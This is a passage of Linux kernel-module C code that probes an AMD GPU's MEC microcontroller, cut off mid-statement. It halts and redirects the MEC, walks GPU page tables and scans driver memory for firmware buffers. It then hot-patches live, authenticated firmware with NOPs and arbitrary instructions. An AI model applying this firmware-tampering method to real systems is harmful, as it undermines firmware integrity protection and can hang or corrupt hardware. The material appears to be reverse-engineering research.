		pr_info("fw36: Halted: RS64=0x%08X MEC=0x%08X PC=0x%04X\n",
			rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC_CNTL),
			rr(regCP_MEC1_INSTR_PNTR));

		/* Step 2: Write PRGRM_CNTR_START to a known value */
		wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x0); /* redirect to PC=0 */
		udelay(100);
		pr_info("fw36: PRGRM_CNTR_START set to 0x%08X\n",
			rr(regCP_MEC_RS64_PRGRM_CNTR_START));

		/* Step 3: Pipe reset (assert + deassert) to restart MEC at new PC */
		wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) | (1 << 16) |
			(1 << 17) | (1 << 18) | (1 << 19)); /* all pipe resets */
		udelay(1000);
		pr_info("fw36: Pipe resets asserted: RS64=0x%08X PC=0x%04X\n",
			rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC1_INSTR_PNTR));

		/* Step 4: Unhalt + clear pipe resets */
		wr(regCP_MEC_RS64_CNTL, rs64_save); /* original value, no halt, no reset */
		wr(regCP_MEC_CNTL, mec_cntl_save);
		udelay(5000);

		pc_check = rr(regCP_MEC1_INSTR_PNTR);
		pr_info("fw36: After unhalt+reset: PC=0x%04X (orig=0x%04X)\n",
			pc_check, pc_orig);

		if (pc_check != pc_orig) {
			pr_info("fw36: *** PC MOVED FROM 0x%04X TO 0x%04X! ***\n",
				pc_orig, pc_check);
			if (pc_check == 0)
				pr_info("fw36: *** PC=0 — MEC restarted from PRGRM_CNTR_START! ***\n");
		}

		/* Step 5: Try another approach — set ACTIVE bits after reset */
		pr_info("fw36: --- 10D: Set ACTIVE bits explicitly ---\n");
		{
			/* Halt again */
			wr(regCP_MEC_RS64_CNTL, rs64_save | (1 << 30));
			udelay(500);

			/* Set PRGRM_CNTR_START to 0 */
			wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x0);

			/* Invalidate IC */
			wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) | (1 << 4));
			udelay(500);

			/* Assert pipe resets */
			wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) |
				(1 << 16) | (1 << 17));
			udelay(500);

			/* Clear resets + set ACTIVE + clear halt */
			wr(regCP_MEC_RS64_CNTL,
				(1 << 26) | (1 << 27) | (1 << 28) | (1 << 29)); /* all pipes active */
			udelay(5000);

			pc_check = rr(regCP_MEC1_INSTR_PNTR);
			pr_info("fw36: After ACTIVE set: RS64=0x%08X PC=0x%04X\n",
				rr(regCP_MEC_RS64_CNTL), pc_check);

			if (pc_check == 0 || pc_check != pc_orig)
				pr_info("fw36: *** PC CHANGED to 0x%04X! ***\n", pc_check);
		}

		/* Restore everything */
		pr_info("fw36: Restoring original state...\n");
		wr(regCP_MEC_RS64_PRGRM_CNTR_START, pcs_lo_save);
		wr(regCP_MEC_RS64_PRGRM_CNTR_START_HI, pcs_hi_save);
		wr(regCP_MEC_RS64_CNTL, rs64_save);
		wr(regCP_MEC_CNTL, mec_cntl_save);
		udelay(2000);

		pr_info("fw36: Restored: RS64=0x%08X MEC=0x%08X PC=0x%04X PCS=0x%08X\n",
			rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC_CNTL),
			rr(regCP_MEC1_INSTR_PNTR),
			rr(regCP_MEC_RS64_PRGRM_CNTR_START));
	}

	/* ============================================================
	 * PHASE 11: GPU PAGE TABLE WALK — Resolve IC_BASE GPU VA to VRAM phys
	 *
	 * IC_BASE = 0x20681D4000 is a GPU virtual address.
	 * MM_INDEX accesses physical VRAM (offset from FB start).
	 * We need to walk the GPU page tables to find the physical VRAM
	 * offset backing IC_BASE's GPU VA.
	 *
	 * GPU page tables: VMID 0 (kernel), page table base in VM_CONTEXT0_PAGE_TABLE_BASE
	 * GFX12 uses 5-level page tables (PDB4 → PDB3 → PDB2 → PDB1 → PTB)
	 * PTE format: [47:12] = physical page frame, [11:0] = flags
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 11: GPU VA → PHYS RESOLUTION ==========\n");
	{
		u64 ic_base_full = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
				   rr(regCP_CPC_IC_BASE_LO);
		u64 fb_base_val = (u64)rr(GC0(0x1614)) << 24;

		/* Read VMID0 page table base address.
		 * mmVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32 and _HI32
		 * These are at MMHUB/GC offsets. For GFX12:
		 * MMHUB is at different base. Let's try common offsets. */

		/* Try GC base for VM context registers */
		#define regVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32 GC0(0x168F)
		#define regVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_HI32 GC0(0x1690)
		#define regMC_VM_FB_LOCATION_BASE GC0(0x1614)
		#define regMC_VM_FB_OFFSET GC0(0x1616)

		u64 pt_base_lo = rr(regVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32);
		u64 pt_base_hi = rr(regVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_HI32);
		u64 pt_base = (pt_base_hi << 32) | pt_base_lo;
		u32 fb_offset = rr(regMC_VM_FB_OFFSET);

		pr_info("fw36: IC_BASE GPU VA = 0x%016llX\n", ic_base_full);
		pr_info("fw36: FB_BASE = 0x%llX, FB_OFFSET = 0x%08X\n",
			fb_base_val, fb_offset);
		pr_info("fw36: VMID0 PT_BASE = 0x%llX (LO=0x%llX HI=0x%llX)\n",
			pt_base, pt_base_lo, pt_base_hi);

		/* The page table base is typically a physical VRAM address
		 * divided by 4KB (right-shifted by 12).
		 * PT physical = PT_BASE << 12 */
		{
			u64 pt_phys = pt_base << 12;
			u64 pt_vram_off = pt_phys - fb_base_val;

			pr_info("fw36: PT phys = 0x%llX, PT VRAM offset = 0x%llX\n",
				pt_phys, pt_vram_off);

			/* Walk the page table for IC_BASE address.
			 * GFX12 VA layout (48-bit):
			 * [47:39] = PDB3 index (9 bits)
			 * [38:30] = PDB2 index (9 bits)
			 * [29:21] = PDB1 index (9 bits)
			 * [20:12] = PTB index  (9 bits)
			 * [11:0]  = page offset (12 bits, 4KB pages)
			 *
			 * But IC_BASE = 0x20681D4000 — bit 37 is set.
			 * Bits [47:0] = 0x0020_681D_4000
			 * PDB3 idx: [47:39] = 0 (if 48-bit VA)
			 * But GFX12 might use different split. Try 4-level. */

			u64 va = ic_base_full;
			int pdb3_idx = (va >> 39) & 0x1FF;
			int pdb2_idx = (va >> 30) & 0x1FF;
			int pdb1_idx = (va >> 21) & 0x1FF;
			int ptb_idx  = (va >> 12) & 0x1FF;
			int page_off = va & 0xFFF;

			pr_info("fw36: VA breakdown: PDB3=%d PDB2=%d PDB1=%d PTB=%d off=0x%X\n",
				pdb3_idx, pdb2_idx, pdb1_idx, ptb_idx, page_off);

			/* Read PDB3 entry — but pt_vram_off might be wrong.
			 * Try reading directly if pt_vram_off < 16GB */
			if (pt_vram_off < 0x400000000ULL) {
				u64 pdb3_entry_addr = pt_vram_off + pdb3_idx * 8;
				u32 pdb3_lo = vram_read32(pdb3_entry_addr);
				u32 pdb3_hi = vram_read32(pdb3_entry_addr + 4);
				u64 pdb3_entry = ((u64)pdb3_hi << 32) | pdb3_lo;

				pr_info("fw36: PDB3[%d] at VRAM+0x%llX = 0x%016llX\n",
					pdb3_idx, pdb3_entry_addr, pdb3_entry);

				if (pdb3_entry & 0x1) { /* Valid bit */
					u64 pdb2_base = (pdb3_entry & 0xFFFFFFFFF000ULL);
					u64 pdb2_vram = pdb2_base - fb_base_val;
					u64 pdb2_entry_addr = pdb2_vram + pdb2_idx * 8;

					if (pdb2_vram < 0x400000000ULL) {
						u32 pdb2_lo = vram_read32(pdb2_entry_addr);
						u32 pdb2_hi = vram_read32(pdb2_entry_addr + 4);
						u64 pdb2_entry = ((u64)pdb2_hi << 32) | pdb2_lo;

						pr_info("fw36: PDB2[%d] at VRAM+0x%llX = 0x%016llX\n",
							pdb2_idx, pdb2_entry_addr, pdb2_entry);

						if (pdb2_entry & 0x1) {
							u64 pdb1_base = (pdb2_entry & 0xFFFFFFFFF000ULL);
							u64 pdb1_vram = pdb1_base - fb_base_val;
							u64 pdb1_entry_addr = pdb1_vram + pdb1_idx * 8;

							if (pdb1_vram < 0x400000000ULL) {
								u32 pdb1_lo = vram_read32(pdb1_entry_addr);
								u32 pdb1_hi = vram_read32(pdb1_entry_addr + 4);
								u64 pdb1_entry = ((u64)pdb1_hi << 32) | pdb1_lo;

								pr_info("fw36: PDB1[%d] at VRAM+0x%llX = 0x%016llX\n",
									pdb1_idx, pdb1_entry_addr, pdb1_entry);

								if (pdb1_entry & 0x1) {
									/* Check if this is a large page (2MB) */
									if (pdb1_entry & (1ULL << 1)) { /* PTE bit */
										u64 phys = (pdb1_entry & 0xFFFFFFFFF000ULL);
										u64 fw_phys = phys + (va & 0x1FFFFF);
										u64 fw_vram = fw_phys - fb_base_val;
										pr_info("fw36: *** 2MB PAGE: phys=0x%llX VRAM=0x%llX ***\n",
											fw_phys, fw_vram);

										/* Read firmware at resolved address */
										if (fw_vram < 0x400000000ULL) {
											u32 d[4];
											d[0] = vram_read32(fw_vram);
											d[1] = vram_read32(fw_vram + 4);
											d[2] = vram_read32(fw_vram + 8);
											d[3] = vram_read32(fw_vram + 12);
											pr_info("fw36: FW at resolved addr: %08X %08X %08X %08X\n",
												d[0], d[1], d[2], d[3]);
										}
									} else {
										u64 ptb_base = (pdb1_entry & 0xFFFFFFFFF000ULL);
										u64 ptb_vram = ptb_base - fb_base_val;
										u64 ptb_entry_addr = ptb_vram + ptb_idx * 8;

										if (ptb_vram < 0x400000000ULL) {
											u32 ptb_lo = vram_read32(ptb_entry_addr);
											u32 ptb_hi = vram_read32(ptb_entry_addr + 4);
											u64 ptb_entry = ((u64)ptb_hi << 32) | ptb_lo;

											pr_info("fw36: PTB[%d] at VRAM+0x%llX = 0x%016llX\n",
												ptb_idx, ptb_entry_addr, ptb_entry);

											if (ptb_entry & 0x1) {
												u64 fw_phys = (ptb_entry & 0xFFFFFFFFF000ULL) + page_off;
												u64 fw_vram = fw_phys - fb_base_val;
												pr_info("fw36: *** RESOLVED: GPU VA 0x%llX → phys 0x%llX → VRAM+0x%llX ***\n",
													va, fw_phys, fw_vram);

												if (fw_vram < 0x400000000ULL) {
													u32 d[8];
													int di;
													for (di = 0; di < 8; di++)
														d[di] = vram_read32(fw_vram + di * 4);
													pr_info("fw36: FW at resolved: %08X %08X %08X %08X\n",
														d[0], d[1], d[2], d[3]);
													pr_info("fw36: FW at resolved: %08X %08X %08X %08X\n",
														d[4], d[5], d[6], d[7]);

													/* Try canary write */
													{
														u32 sv = d[7];
														vram_write32(fw_vram + 28, 0xDEAD1337);
														udelay(100);
														pr_info("fw36: Canary: wrote 0xDEAD1337 read 0x%08X %s\n",
															vram_read32(fw_vram + 28),
															vram_read32(fw_vram + 28) == 0xDEAD1337 ?
															"*** RESOLVED VRAM WRITABLE! ***" : "nope");
														vram_write32(fw_vram + 28, sv);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			} else {
				pr_info("fw36: PT VRAM offset too large (0x%llX), skipping walk\n",
					pt_vram_off);
			}

			/* Alternative approach: use driver's GART manager to resolve.
			 * amdgpu stores firmware BOs. Search for the MC address that
			 * corresponds to IC_BASE's GPU VA. The MC→VRAM translation
			 * is MC_addr - FB_BASE = VRAM_offset. */
			pr_info("fw36: --- Alt: Search for IC_BASE MC address in driver ---\n");
			{
				/* In RDNA4, GPU VA 0x20XXXXXXXX is in GART space.
				 * GART maps GPU VA → system physical / VRAM physical.
				 * The driver's fw BO mc_addr IS the GART-mapped address.
				 * Search adev->gfx.mec structure for mc_addr fields. */
				int off;
				u64 ic_lo = rr(regCP_CPC_IC_BASE_LO);

				/* Search wider: any field containing IC_BASE_LO value */
				for (off = 0; off < 0x80000; off += 8) {
					u64 v = *(u64 *)((u8 *)adev + off);
					if (v == ic_base_full) {
						pr_info("fw36: IC_BASE found at adev+0x%X = 0x%llX\n",
							off, v);
						/* Dump context around it */
						if (off >= 16) {
							pr_info("fw36:   [-16] 0x%llX\n",
								*(u64 *)((u8 *)adev + off - 16));
							pr_info("fw36:   [-8]  0x%llX\n",
								*(u64 *)((u8 *)adev + off - 8));
						}
						pr_info("fw36:   [+8]  0x%llX\n",
							*(u64 *)((u8 *)adev + off + 8));
						pr_info("fw36:   [+16] 0x%llX\n",
							*(u64 *)((u8 *)adev + off + 16));
					}
				}

				/* Also search for the GART-translated MC address.
				 * If IC_BASE is in GART: MC = IC_BASE (GART is identity-mapped
				 * or has its own translation).
				 * For VRAM BOs, mc_addr = fb_base + vram_offset.
				 * Try: 0x8000000000 + some offset */
				pr_info("fw36: Searching for mc_addr with IC_BASE_LO pattern...\n");
				for (off = 0; off < 0x80000; off += 8) {
					u64 v = *(u64 *)((u8 *)adev + off);
					/* MC addr in VRAM range with same low bits as IC_BASE */
					if (v >= 0x8000000000ULL && v < 0x9800000000ULL &&
					    (v & 0xFFFFF) == (ic_base_full & 0xFFFFF)) {
						u64 vram_off = v - fb_base_val;
						pr_info("fw36: MC match at adev+0x%X: 0x%llX (VRAM+0x%llX)\n",
							off, v, vram_off);
						if (vram_off < 0x400000000ULL) {
							u32 d[4];
							d[0] = vram_read32(vram_off);
							d[1] = vram_read32(vram_off + 4);
							d[2] = vram_read32(vram_off + 8);
							d[3] = vram_read32(vram_off + 12);
							pr_info("fw36:   data: %08X %08X %08X %08X\n",
								d[0], d[1], d[2], d[3]);
						}
					}
				}
			}
		}
	}

	/* ============================================================
	 * PHASE 12: GART/GPUVM BO hunt — find firmware via driver structures
	 *
	 * The driver allocates firmware BOs using amdgpu_bo_create_kernel().
	 * These BOs have:
	 *   - mc_addr (GART-mapped GPU virtual address)
	 *   - cpu_addr (kernel virtual mapping)
	 * The cpu_addr IS the kptr we can read/write from kernel space.
	 * adev->gfx.mec.mec_fw_data_obj, adev->gfx.mec.mec_fw_data_mc_addr,
	 * adev->gfx.mec.mec_fw_data_ptr
	 *
	 * For RS64, the driver loads firmware into a GART BO, then tells PSP
	 * the MC address. After PSP authenticates, MEC reads from GART.
	 * The GART BO's cpu_addr is kernel-accessible and == the firmware data.
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 12: GART BO FIRMWARE HUNT ==========\n");
	{
		/* Strategy: find amdgpu_bo_create_kernel results.
		 * The pattern in adev is:
		 *   amdgpu_bo* (kptr) | mc_addr (u64) | cpu_addr (kptr)
		 * mc_addr will be in GART range: 0x0000000000-0x00FFFFFFFF (first 4GB)
		 * or in VRAM range: 0x8000000000+
		 *
		 * For MEC fw: mc_addr should match IC_BASE GPU VA.
		 * But IC_BASE = 0x20681D4000 — this is OUTSIDE the GART aperture.
		 * So MEC fw is in VRAM, not GART.
		 *
		 * Search for: any triplet (kptr, mc_addr_in_vram_range, kptr)
		 * where mc_addr maps to IC_BASE area */

		u64 ic_base_full = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
				   rr(regCP_CPC_IC_BASE_LO);
		u64 fb_base_val = (u64)rr(GC0(0x1614)) << 24;
		int off;
		int found_bo = 0;

		/* First: the MDBASE address may point to the data segment.
		 * MDBASE_LO=0xD68E0000 — this looks like a VRAM MC address.
		 * VRAM offset = MDBASE - FB_BASE = 0xD68E0000 - 0x8000000000
		 * That's negative... so MDBASE might be in a different space.
		 * Actually MDBASE_HI could give us the full address. */
		{
			u32 mdbase_lo = rr(regCP_MEC_MDBASE_LO);
			u32 mdbase_hi = rr(regCP_MEC_MDBASE_HI);
			u64 mdbase = ((u64)mdbase_hi << 32) | mdbase_lo;
			u32 mibound_lo = rr(regCP_MEC_MIBOUND_LO);
			u32 mibound_hi = rr(regCP_MEC_MIBOUND_HI);

			pr_info("fw36: MDBASE  = 0x%08X:%08X (full: 0x%llX)\n",
				mdbase_hi, mdbase_lo, mdbase);
			pr_info("fw36: MIBOUND = 0x%08X:%08X\n", mibound_hi, mibound_lo);

			/* If MDBASE is in VRAM range, try reading its data */
			if (mdbase >= fb_base_val && mdbase < fb_base_val + 0x400000000ULL) {
				u64 md_vram = mdbase - fb_base_val;
				u32 d[4];
				d[0] = vram_read32(md_vram);
				d[1] = vram_read32(md_vram + 4);
				d[2] = vram_read32(md_vram + 8);
				d[3] = vram_read32(md_vram + 12);
				pr_info("fw36: MDBASE VRAM+0x%llX: %08X %08X %08X %08X\n",
					md_vram, d[0], d[1], d[2], d[3]);
			} else {
				pr_info("fw36: MDBASE not in VRAM range\n");
			}
		}

		/* Search adev for BO triplet patterns.
		 * For RS64 MEC FW, the driver does:
		 *   amdgpu_bo_create_kernel(adev, fw_size, PAGE_SIZE,
		 *     AMDGPU_GEM_DOMAIN_VRAM, &mec_fw_obj,
		 *     &mec_fw_mc_addr, &mec_fw_ptr);
		 * So the struct has: obj(kptr), mc_addr(u64), ptr(kptr) */
		pr_info("fw36: Scanning for BO triplets (kptr/mc_addr/kptr)...\n");
		for (off = 0x18000; off < 0x60000 && found_bo < 20; off += 8) {
			u64 v0 = *(u64 *)((u8 *)adev + off);
			u64 v1 = *(u64 *)((u8 *)adev + off + 8);
			u64 v2 = *(u64 *)((u8 *)adev + off + 16);

			/* Pattern: kptr, VRAM mc_addr, kptr (cpu mapping) */
			if ((v0 >> 48) == 0xFFFF && v0 != 0xFFFFFFFFFFFFFFFFULL &&
			    v1 >= fb_base_val && v1 < fb_base_val + 0x400000000ULL &&
			    (v1 & 0xFFF) == 0 &&
			    (v2 >> 48) == 0xFFFF && v2 != 0xFFFFFFFFFFFFFFFFULL &&
			    v2 != v0) {
				u32 hdr[4];
				u64 vram_off = v1 - fb_base_val;

				/* Read via cpu_addr (v2) to see what's there */
				if (copy_from_kernel_nofault(hdr, (void *)(unsigned long)v2, 16) == 0) {
					pr_info("fw36: BO at adev+0x%X: obj=0x%llX mc=0x%llX "
						"(VRAM+0x%llX) cpu=0x%llX\n",
						off, v0, v1, vram_off, v2);
					pr_info("fw36:   cpu data: %08X %08X %08X %08X\n",
						hdr[0], hdr[1], hdr[2], hdr[3]);

					/* Check if this might be firmware.
					 * MEC RS64 firmware might start with RISC-V reset vector. */
					if ((hdr[0] & 0x7F) == 0x17 || /* AUIPC */
					    (hdr[0] & 0x7F) == 0x37 || /* LUI */
					    (hdr[0] & 0x7F) == 0x6F || /* JAL */
					    hdr[0] == 0x00000297) {     /* AUIPC t0, 0 */
						pr_info("fw36: *** POSSIBLE RS64 FIRMWARE! ***\n");
					}

					/* Check if mc_addr relates to IC_BASE */
					if ((v1 & 0x0FFFFFFFULL) == (ic_base_full & 0x0FFFFFFFULL)) {
						pr_info("fw36: *** MC ADDR MATCHES IC_BASE LOW BITS! ***\n");
					}

					/* Try writing canary via cpu_addr */
					{
						u32 orig = hdr[3];
						u32 canary = 0xFEEDFACE;
						if (copy_to_kernel_nofault(
							(void *)(unsigned long)(v2 + 12),
							&canary, 4) == 0) {
							u32 rb;
							copy_from_kernel_nofault(&rb,
								(void *)(unsigned long)(v2 + 12), 4);
							pr_info("fw36:   canary via cpu: wrote 0x%08X read 0x%08X %s\n",
								canary, rb,
								rb == canary ? "WRITABLE" : "nope");
							/* Restore */
							copy_to_kernel_nofault(
								(void *)(unsigned long)(v2 + 12),
								&orig, 4);
						}
					}

					found_bo++;
				}
			}
		}

		if (!found_bo)
			pr_info("fw36: No BO triplets found\n");

		/* Also try: search for the GPU VA 0x20681D4000 value
		 * but with the GART aperture prefix stripped.
		 * In AMD's address space, 0x20XXXXXXXX might mean
		 * "GART page table base 0x20 + offset 0x681D4000".
		 * The actual backing memory mc_addr would be different. */
		pr_info("fw36: Searching adev for any reference to 0x681D4...\n");
		{
			int sf;
			for (sf = 0; sf < 0x80000; sf += 4) {
				u32 v = *(u32 *)((u8 *)adev + sf);
				if (v == 0x681D4000 || v == 0x681D4) {
					u64 ctx = *(u64 *)((u8 *)adev + sf - 4);
					u64 ctx2 = *(u64 *)((u8 *)adev + sf + 4);
					pr_info("fw36: 0x681D4 ref at adev+0x%X: "
						"prev=0x%llX val=0x%08X next=0x%llX\n",
						sf, ctx, v, ctx2);
				}
			}
		}
	}

	/* ============================================================
	 * PHASE 13: EXPLOIT FIRMWARE BO — Direct hot-patch via cpu_addr
	 *
	 * CONFIRMED: adev+0x3BAC0 has the MEC firmware BO:
	 *   mc_addr = 0x80007EE000 (VRAM+0x7EE000)
	 *   cpu_addr = 0xFFFFCF87407EE000
	 *   First dword = 0x0000006F (RISC-V JAL — reset vector)
	 *   WRITABLE via cpu_addr!
	 *
	 * Plan: Dump the firmware, find the instruction at current PC offset,
	 * modify it, see if MEC behavior changes.
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 13: FIRMWARE BO HOT-PATCH ==========\n");
	{
		u64 fw_cpu_addr = *(u64 *)((u8 *)adev + 0x3BAC0 + 16);
		u64 fw_mc_addr  = *(u64 *)((u8 *)adev + 0x3BAC0 + 8);
		u64 fw_bo_ptr   = *(u64 *)((u8 *)adev + 0x3BAC0);
		u32 pc_val = rr(regCP_MEC1_INSTR_PNTR);
		u32 pc_check;
		u32 fw_data[64];
		int i;

		pr_info("fw36: FW BO: obj=0x%llX mc=0x%llX cpu=0x%llX\n",
			fw_bo_ptr, fw_mc_addr, fw_cpu_addr);

		/* Verify cpu_addr is valid */
		if (copy_from_kernel_nofault(fw_data, (void *)(unsigned long)fw_cpu_addr, 256) != 0) {
			pr_info("fw36: Cannot read from cpu_addr — aborting\n");
			goto phase13_done;
		}

		/* Dump first 256 bytes (64 instructions) of firmware */
		pr_info("fw36: Firmware dump (first 256 bytes):\n");
		for (i = 0; i < 64; i += 4)
			pr_info("fw36:   [%3d] %08X %08X %08X %08X\n",
				i, fw_data[i], fw_data[i+1], fw_data[i+2], fw_data[i+3]);

		/* Now read around the PC location.
		 * PC=0x04A7 means instruction address 0x04A7.
		 * Each instruction is 4 bytes.
		 * Byte offset = PC * 4 = 0x129C */
		{
			u64 pc_byte_off = (u64)pc_val * 4;
			u32 pc_data[32];

			pr_info("fw36: PC=0x%04X, byte offset=0x%llX\n", pc_val, pc_byte_off);

			/* Check if pc_byte_off is within firmware BO size.
			 * BO size can be found from the BO struct. Let's try up to 256KB. */
			if (copy_from_kernel_nofault(pc_data,
				(void *)(unsigned long)(fw_cpu_addr + pc_byte_off), 128) == 0) {
				pr_info("fw36: Firmware at PC:\n");
				for (i = 0; i < 32; i += 4)
					pr_info("fw36:   [PC+%02d] %08X %08X %08X %08X\n",
						i, pc_data[i], pc_data[i+1],
						pc_data[i+2], pc_data[i+3]);

				/* === THE HOT-PATCH ===
				 * Write to GP scratch register from MEC firmware.
				 * We need to modify one instruction at PC to something
				 * that has a visible effect.
				 *
				 * Strategy 1: Write a NOP at PC, check if PC moves.
				 * If MEC is looping at this instruction, replacing it
				 * with NOP should make it fall through to the next. */
				{
					u32 orig_at_pc = pc_data[0];
					u32 orig_next = pc_data[1];
					u32 nop = 0x00000013; /* RISC-V NOP */

					pr_info("fw36: === ATTEMPTING FIRMWARE HOT-PATCH ===\n");
					pr_info("fw36: Original at PC: 0x%08X\n", orig_at_pc);

					/* Write NOP at PC */
					if (copy_to_kernel_nofault(
						(void *)(unsigned long)(fw_cpu_addr + pc_byte_off),
						&nop, 4) == 0) {

						/* Small delay to see if MEC reads new instruction */
						udelay(5000);

						pc_check = rr(regCP_MEC1_INSTR_PNTR);
						pr_info("fw36: After NOP write: PC = 0x%04X %s\n",
							pc_check,
							pc_check != pc_val ?
							"*** PC MOVED! HOT-PATCH WORKS! ***" : "unchanged");

						/* Restore original instruction */
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_cpu_addr + pc_byte_off),
							&orig_at_pc, 4);
						udelay(1000);

						pr_info("fw36: After restore: PC = 0x%04X\n",
							rr(regCP_MEC1_INSTR_PNTR));
					} else {
						pr_info("fw36: copy_to_kernel_nofault failed at PC offset\n");
					}

					/* Strategy 2: Write a JAL-to-self at PC.
					 * If MEC IS reading from this BO, a JAL-to-self should
					 * keep PC exactly at the same value but the instruction
					 * content changes — we can verify via MM_INDEX read
					 * at the VRAM offset */
					{
						u32 jal_self = 0x0000006F;
						u32 vram_orig, vram_after;
						u64 fw_vram_off = fw_mc_addr - 0x8000000000ULL + pc_byte_off;

						pr_info("fw36: VRAM check: reading VRAM+0x%llX\n", fw_vram_off);
						vram_orig = vram_read32(fw_vram_off);
						pr_info("fw36: VRAM at PC via MM_INDEX: 0x%08X\n", vram_orig);
						pr_info("fw36: CPU at PC via kptr:      0x%08X\n",
							*(u32 *)(unsigned long)(fw_cpu_addr + pc_byte_off));

						if (vram_orig == orig_at_pc) {
							pr_info("fw36: *** VRAM AND CPU MATCH! This IS the live FW! ***\n");
						} else {
							pr_info("fw36: VRAM != CPU — different regions or caching\n");
						}

						/* Write JAL-to-self via BOTH paths and check */
						pr_info("fw36: Writing JAL-to-self via cpu_addr...\n");
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_cpu_addr + pc_byte_off),
							&jal_self, 4);
						udelay(100);

						/* Read back via MM_INDEX to confirm VRAM was modified */
						vram_after = vram_read32(fw_vram_off);
						pr_info("fw36: VRAM after cpu write: 0x%08X %s\n",
							vram_after,
							vram_after == jal_self ?
							"*** CPU→VRAM COHERENT! ***" : "not coherent");

						/* Check PC */
						udelay(5000);
						pr_info("fw36: PC after JAL-self: 0x%04X\n",
							rr(regCP_MEC1_INSTR_PNTR));

						/* Restore */
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_cpu_addr + pc_byte_off),
							&orig_at_pc, 4);
					}

					/* Strategy 3: Write to GP scratch register via MEC.
					 * Find the GP scratch register address in MEC's MMIO space.
					 * In RISC-V, to write a GP register:
					 *   LUI  a0, 0xDEAD1     (a0 = 0xDEAD1000)
					 *   ADDI a0, a0, 0x337    (a0 = 0xDEAD1337)
					 *   # Then need a CSR/MMIO write instruction
					 * But MEC RS64 has custom extensions for GPU reg access.
					 * For now, just check if we can write arbitrary instructions. */
					pr_info("fw36: Verifying arbitrary instruction write...\n");
					{
						u32 test_instrs[] = {
							0xDEADBEEF, /* garbage — should not be valid RISC-V */
							0x00000013, /* NOP */
							0x00100093, /* ADDI x1, x0, 1 */
							orig_at_pc  /* restore */
						};
						int ti;
						for (ti = 0; ti < 4; ti++) {
							copy_to_kernel_nofault(
								(void *)(unsigned long)(fw_cpu_addr + pc_byte_off),
								&test_instrs[ti], 4);
							udelay(100);
							{
								u32 rb;
								copy_from_kernel_nofault(&rb,
									(void *)(unsigned long)(fw_cpu_addr + pc_byte_off), 4);
								pr_info("fw36:   Wrote 0x%08X, readback 0x%08X %s PC=0x%04X\n",
									test_instrs[ti], rb,
									rb == test_instrs[ti] ? "OK" : "FAIL",
									rr(regCP_MEC1_INSTR_PNTR));
							}
						}
					}
				}
			} else {
				pr_info("fw36: Cannot read firmware at PC offset 0x%llX — BO too small?\n",
					pc_byte_off);

				/* The BO might be smaller than 0x129C bytes.
				 * Check BO size from the amdgpu_bo struct. */
				pr_info("fw36: Checking BO size...\n");
				{
					/* amdgpu_bo->tbo.base.size is at various offsets.
					 * Try reading dwords near the BO pointer to find size. */
					int boff;
					for (boff = 0x20; boff < 0x100; boff += 8) {
						u64 bv;
						if (copy_from_kernel_nofault(&bv,
							(void *)(unsigned long)(fw_bo_ptr + boff), 8) == 0) {
							/* Size should be 4KB-aligned and < 1MB */
							if (bv > 0 && bv <= 0x100000 && (bv & 0xFFF) == 0) {
								pr_info("fw36:   BO+0x%X = 0x%llX (possible size)\n",
									boff, bv);
							}
						}
					}
				}
			}
		}
	}
phase13_done:

	/* ============================================================
	 * PHASE 14: WIDER BO SCAN — Find ALL VRAM BOs with kernel mappings
	 *
	 * The BO at 0x3BAC0 is a 4KB trampoline stub, not actual MEC firmware.
	 * Real firmware is likely in a larger BO (64KB-256KB).
	 * Scan wider range of adev for BO triplets and check sizes.
	 * Also check the SECOND BO at 0x3BAD8 and scan around gfx.mec struct.
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 14: WIDE BO SCAN ==========\n");
	{
		u64 fb_base_val = (u64)rr(GC0(0x1614)) << 24;
		int off, found = 0;

		/* Scan entire adev range for BO patterns */
		for (off = 0x100; off < 0x80000 && found < 30; off += 8) {
			u64 v0 = *(u64 *)((u8 *)adev + off);

			/* Look for kptr to amdgpu_bo structures.
			 * BO structures have .tbo.bdev pointer at offset 0x18
			 * pointing back to adev->mman.bdev.
			 * Better: just look for any kptr followed by VRAM mc_addr */
			if ((v0 >> 48) == 0xFFFF && v0 != 0xFFFFFFFFFFFFFFFFULL) {
				u64 v1 = *(u64 *)((u8 *)adev + off + 8);
				/* MC addr in VRAM range, page aligned */
				if (v1 >= fb_base_val && v1 < fb_base_val + 0x400000000ULL &&
				    (v1 & 0xFFF) == 0) {
					u64 v2 = *(u64 *)((u8 *)adev + off + 16);
					u64 vram_off = v1 - fb_base_val;

					/* v2 could be cpu_addr (kptr) */
					if ((v2 >> 48) == 0xFFFF && v2 != 0xFFFFFFFFFFFFFFFFULL &&
					    v2 != v0) {
						/* Try to read the BO's size from the struct.
						 * amdgpu_bo inherits from ttm_buffer_object.
						 * tbo.base.size is usually at offset ~0x60-0x80 */
						u64 bo_size = 0;
						int sz;
						for (sz = 0x50; sz < 0xA0; sz += 8) {
							u64 sv;
							if (copy_from_kernel_nofault(&sv,
								(void *)(unsigned long)(v0 + sz), 8) == 0) {
								if (sv > 0 && sv <= 0x1000000 &&
								    (sv & 0xFFF) == 0 && sv >= 0x1000) {
									bo_size = sv;
									break;
								}
							}
						}

						/* Read first 16 bytes of data */
						{
							u32 hdr[4] = {0};
							copy_from_kernel_nofault(hdr,
								(void *)(unsigned long)v2, 16);

